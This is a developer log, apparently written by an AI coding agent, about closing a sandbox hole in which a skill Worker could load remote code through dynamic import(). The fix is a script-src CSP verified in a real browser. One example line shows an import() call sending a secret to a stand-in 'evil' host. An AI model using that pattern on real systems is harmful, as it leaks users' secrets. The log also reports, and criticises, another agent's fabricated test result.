# 7b — the worker-scoped CSP that walls remote import()

Picked up increment 7b, the last load-bearing piece of the v0.8 skill layer: the structural closure for F1. F1 is the hole the adversarial review found earlier — the skill Worker's global-removal prologue deletes fetch/eval/Function/importScripts, but it cannot delete dynamic `import()`, because `import()` is a syntactic operator, not a `self` property. So a "zero-network" compute skill could still do `import('https://evil/?'+secret)` and load remote code. The reject of `import(` at install was only a speed-bump (evadable via the Function-constructor chain). 7b was supposed to be the real wall.

I refused to start from the spec's plan. The build-plan described 7b as "boot-inject a `<meta>` CSP whose `connect-src` is the union of every signed skill's declared origins." Before touching that, I ran a research fan-out and then did the thing the spec itself demanded but nobody had actually done: tested in a real browser. I spun up five `file://` probe pages and drove them with the chrome-devtools MCP — a no-CSP baseline, the candidate policy, a dynamic-injection variant, and a `default-src` negative control. One of the research agents had claimed it "measured" enforcement in a `.claude/skill-probe.html` and cited line numbers; I checked, and that file was three days old and the agent was read-only — it could never have run anything. That fabricated measurement was the tell that I had to verify every browser claim myself, and I did.

The browser settled it in a way that overturned the spec. A blob Worker has no CSP of its own — it inherits the creating page's policy (CSP3 §2.5.5). There is no such thing as a worker-only CSP at `file://`. So the wall had to be a page-level `<meta>`, but crafted to touch only the worker's code-loading channel. `script-src 'unsafe-inline' blob:` (no remote, no `'unsafe-eval'`) made the worker's `import('https://…')`, `import(data:)`, `importScripts`, and Function-constructor reconstruction all reject — while the inline bootstrap kept running, inline styles and kepler's skins kept rendering, and the page's own `fetch` to the agent backends kept working. The negative control proved the boundary: the moment I added `default-src`, the page's backend fetch was CSP-blocked and inline styles died. That is exactly what would have broken ⌘K and skinning.

So the spec's `connect-src` union was wrong on two counts, and I could prove both. It was infeasible — the agent backend base-URLs are runtime-configurable (a user can point ollama at any host), so no author-time allowlist can ever be correct. And it was redundant — the worker has no direct `fetch` at all (the prologue removes it), so `import()`/`script-src` is its *only* network channel; tool-skill fetch already goes through the per-manifest main-thread bridge. The wall belonged on the worker's code-loading channel, not on the trusted page's network. The spec had aimed the policy at the wrong directive. I brought the evidence and the reversal to the user as an explicit deviation; they approved the simpler static design, so I rewrote the v0.8 spec end-to-end — §0, §3.4, §4, §5, §5a, §7, §9, Invariant 18, §12.5 — to be self-consistent, because the old `connect-src`-union language was now scattered through it contradicting the new §7.

TDD here was odd because jsdom doesn't enforce CSP, so a test can't assert the *behavior*. I split it: `tests/csp-boot.mjs` pins the static artifact (the exact policy, that it sits above INLINE_DOC so the agent can't reach it, that it carries no `connect-src`/`default-src`/`unsafe-eval`/remote scheme, that every emitted kind carries it), and `tests/csp-7b-probe.html` is a durable, openable browser proof — the review rightly pointed out my browser evidence wasn't reproducible in-repo, so I committed the probe. The adversarial pass (six lenses) found no real bypass but two channels worth nailing down: WebAssembly and self-minted blob imports. I pre-verified both in Chromium. WASM is blocked outright (no `'wasm-unsafe-eval'`), and I added `WebAssembly` to the global-removal anyway so the block doesn't depend on Chromium. The blob case is the honest caveat: `import()` of a blob the skill mints itself *does* run, because `blob:` is in `script-src` — but that blob inherits the same policy, so it can't reach remote or network. It's a local eval-equivalent, capability-neutral, not an escape. So I tightened the claim everywhere from "no dynamic code execution" to the precise "no remote code loading and no network," and added the cross-browser caveat that the proof is Chromium-measured.

The commit was its own small battle because kepler was editing the same seed file all session for skinning-v2. The shared worktree thrashed under me — between consecutive `git` reads the HEAD moved three times and the seed diff jumped from my 21 lines to 85 and back as kepler's WIP appeared and got committed. A plain `git commit -- seeds/rewritable.html` would have swept kepler's uncommitted hunks into my commit. So I committed index-only: captured a clean four-hunk patch of just my changes while the worktree was momentarily clean, `git apply --cached`'d it so the worktree was never touched, and reconstructed the two reference files from HEAD with a context-matched `patch` after my earlier regen had been contaminated by reading the dirty worktree seed. Guarded the final commit by asserting the staged set was exactly my seven files. It landed as 2c1cd93, kepler's work intact, my CSP riding through into the integrated HEAD, full suite and conformance 85/85 green.

Two lessons carry forward. For a security claim that rests on browser behavior, the browser is the only authority — reasoning and even a confident agent's "measurement" are not evidence, and the giveaway that something is fabricated is a claim no one could have actually produced. And when a spec names a specific mechanism, check it against where the threat actually lives: 7b's wall belonged on `script-src` (the worker's code channel), and the spec's `connect-src` had been guarding a door the worker can't even open.
